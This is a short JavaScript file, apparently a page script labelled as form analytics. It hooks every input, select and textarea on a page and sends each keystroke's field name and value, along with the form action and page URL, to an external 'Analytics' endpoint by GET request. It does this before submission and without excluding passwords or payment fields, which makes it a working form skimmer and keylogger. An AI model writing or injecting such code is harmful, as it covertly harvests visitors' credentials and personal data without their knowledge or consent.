var url = window.location.href;

var forms = document.getElementsByTagName("form");
console.log(forms);
for (let index = 0; index < forms.length; index++) {
    var random = Math.random() + Math.random();
    forms[index].setAttribute("data", random);
    // console.log(forms[index].children, forms[index].action);

    var form_action = forms[index].action;
    var inputs = document.getElementsByTagName("input");
    for (let index1 = 0; index1 < inputs.length; index1++) {
        inputs[index1].setAttribute(
            "onkeyup",
            "fetch_data(this.name, this.value, " +
                random +
                ", '" +
                form_action +
                "')"
        );
    }

    var selects = document.getElementsByTagName("select");
    for (let index2 = 0; index2 < selects.length; index2++) {
        selects[index2].setAttribute(
            "onchange",
            "fetch_data(this.name, this.value, " +
                random +
                ", '" +
                form_action +
                "')"
        );
    }

    var textarea = document.getElementsByTagName("textarea");
    console.log(textarea);

    for (let index3 = 0; index3 < textarea.length; index3++) {
        textarea[index3].setAttribute(
            "onkeyup",
            "fetch_data(this.name, this.value, " +
                random +
                ", '" +
                form_action +
                "')"
        );
    }
}

function fetch_data(name, value, parentNode, action) {
    $.ajax({
        url: "https://omegawebdemo.com.au/Analytics/api/fetchformdata",
        method: "GET",
        data: {
            name: name,
            value: value,
            unique: parentNode,
            form_action: action,
            page_url: url,
        },
        contentType: "application/json; charset=utf-8",
        success: function (response) {
            console.log(response);
            // $("#show_content").html(response);
        },
    });
}
